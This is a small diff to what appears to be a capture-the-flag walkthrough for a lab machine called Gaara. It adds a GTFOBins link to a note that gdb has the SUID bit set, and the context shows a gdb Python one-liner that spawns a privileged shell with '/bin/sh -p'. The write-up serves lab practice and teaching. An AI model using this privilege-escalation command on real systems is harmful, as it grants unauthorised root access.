@@ -143,7 +143,7 @@ strace Not Found
 <...>
 ```
 
-SUID bit is set for gdb.
+[SUID bit is set for gdb.](https://gtfobins.github.io/gtfobins/gdb/#suid)
 
 ```shell
 gaara@Gaara:~$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
